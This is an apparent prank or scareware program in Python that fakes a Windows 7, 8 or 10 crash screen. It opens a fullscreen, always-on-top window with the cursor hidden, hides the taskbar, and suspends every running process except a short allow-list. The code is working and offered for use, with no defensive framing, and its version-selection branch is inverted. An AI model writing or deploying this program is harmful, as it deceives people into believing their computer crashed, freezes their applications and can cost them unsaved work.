###############################
#
returncode = '0'
dontblock = """python.exe,pythonw.exe,igfxTray.exe,explorer.exe,conhost.exe,py.exe"""
forcetype = 'DISABLED'
nicemodetime = '0'
#
###############################

from tkinter import *
import ctypes
from ctypes import wintypes

import psutil
import time

from threading import Thread
import platform

#------------------------------------------------------------------------------

coredb = """csrss.exe,lsass.exe,CxAudMsg64.exe,System,System Idle Process,
System interrupts, taskhost.exe, taskhostex.exe""".replace('\n', ',').split(',')

dontblock = dontblock.replace('\n', ',').split(',')

for core in coredb:
    dontblock.append(core)

version = platform.release()

if nicemodetime == '0':
    nicemode = False
else:
    nicemode = True

#------------------------------------------------------------------------------

user32 = ctypes.WinDLL("user32")

SW_HIDE = 0
SW_SHOW = 5

user32.FindWindowW.restype = wintypes.HWND
user32.FindWindowW.argtypes = (
    wintypes.LPCWSTR, # lpClassName
    wintypes.LPCWSTR) # lpWindowName

user32.ShowWindow.argtypes = (
    wintypes.HWND, # hWnd
    ctypes.c_int)  # nCmdShow

#------------------------------------------------------------------------------

def blockproc():
    if nicemode == True:
        return
    processes = []
    for proc in psutil.process_iter():
        if not proc.name() in dontblock:
            try:
                psutil.Process(proc.pid).suspend()
            except:
                pass

#------------------------------------------------------------------------------

def benice():
    time.sleep(int(nicemodetime))
    root.destroy()

#------------------------------------------------------------------------------

def hide_taskbar():
    hWnd = user32.FindWindowW(u"Shell_traywnd", None)
    user32.ShowWindow(hWnd, SW_HIDE)

#------------------------------------------------------------------------------

def windows7():
    global killproc
    killproc = Thread(target=blockproc)
    killproc.daemon = True
    killproc.start()
    global root
    root = Tk()
    root.title("BSOD")
    root.resizable(0, 0)
    #root.overrideredirect(1)
    root.lift()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.focus_force()

    root.configure(bg='#0100A6', cursor='none')

    labeltext = """
 A problem has been detected and Windows has been shut down to prevent damage to your computer.

 The problem seems to be caused by the following file: csrss.exe

 PANIC_STACK_SWITCH

 If this is the first time you've seen this Stop error screen,")
 restart your computer. If this screen appears again, follow these steps:


 Check to make sure any new hardwarea or software is properly installed.
 If this is a new installation, ask your hardware or software manufacturer
 for any Windows updates you might need.

 If problems continue, disable or remove any newly installed hardware
 or software. Disable BIOS memory options such as cachine or shadowiing.
 If you need to use Safe Mode to remove or disable components, restart
 your computer, press F8 to select Advanced Startup options, and then
 select Safe Mode.

 Technical information:

 *** STOP: 0x000000EA (0x00000000, 0x00000000)"""

    Label(root, fg='#ffffff', bg='#0100A6', font = 'Consolas 19', justify='left', anchor='w', text=labeltext, wraplength=1400).pack(fill='both')

    root.after(1, lambda: root.focus_force())

    hide_taskbar()
    
    root.mainloop()

#------------------------------------------------------------------------------

def windows8():
    global killproc
    killproc = Thread(target=blockproc)
    killproc.daemon = True
    killproc.start()
    global root
    root = Tk()
    root.title("BSOD")
    root.resizable(0, 0)
    #root.overrideredirect(1)
    root.lift()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.focus_force()

    root.configure(bg='#1965B3', cursor='none')

    Label(root, fg='#ffffff', bg='#1965B3', font = ("Segoe UI", 100),justify='left', anchor='w',wraplength=1400,
          text='\n      :(').pack(fill='both')

    Label(root, fg='#ffffff', bg='#1965B3', font = ("Segoe UI", 25),justify='left', anchor='w',wraplength=1400,
          text='''                         Your PC ran into a problem and needs to restart. We're just
                         collecting some error info, and then you can restart. (0%
                         complete)''').pack(fill='both')

    Label(root, fg='#ffffff', bg='#1965B3', font = ("Segoe UI", 10),justify='left', anchor='w',
          text="""


\t\t\t\t If you'd like to know more, you can search online later for this error: CLOCK_WATCHDOG_TIMEOUT""").pack(fill='both')

    root.mainloop()

#------------------------------------------------------------------------------

def windows10():
    global killproc
    killproc = Thread(target=blockproc)
    killproc.daemon = True
    killproc.start()
    #0177D7
    global root
    root = Tk()
    root.title("BSOD")
    root.resizable(0, 0)
    #root.overrideredirect(1)
    root.lift()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.focus_force()

    root.configure(bg='#1070AA', cursor='none')

    Label(root, fg='#ffffff', bg='#1070AA', font = ("Segoe UI", 95),justify='left', anchor='w',wraplength=1400,
          text='\n      :(').pack(fill='both')

    Label(root, fg='#ffffff', bg='#1070AA', font = ("Segoe UI", 25),justify='left', anchor='w',wraplength=1400,
          text='''                         Your PC ran into a problem and needs to restart. We're just
                         collecting some error info, and then we'll restart for you.

                        0% complete''').pack(fill='both')

    Label(root, fg='#ffffff', bg='#1070AA', font = ("Segoe UI", 10),justify='left', anchor='w',
          text="""


\t\t\t\t If you'd like to know more, you can search online later for this error: CLOCK_WATCHDOG_TIMEOUT
\t\t\t\t What failed: System.exe
\t\t\t\t Return code: """ + returncode).pack(fill='both')

    root.mainloop()

#------------------------------------------------------------------------------

def unhide_taskbar():
    hWnd = user32.FindWindowW(u"Shell_traywnd", None)
    user32.ShowWindow(hWnd, SW_SHOW)

#------------------------------------------------------------------------------

if nicemodetime == '0':
    pass
else:
    nicemode = Thread(target=benice)
    nicemode.daemon = True
    nicemode.start()

if not forcetype == 'DISABLED':
    if version == '7':
        windows7()
    elif version == '8' or version == '8.1':
        windows8()
    elif version == '10':
        windows10()
    else:
        windows8()
else:
    if forcetype == '7':
        windows7()
    elif forcetype == '8' or forcetype == '8.1':
        windows8()
    elif forcetype == '10':
        windows10()
    else:
        windows8()

#------------------------------------------------------------------------------
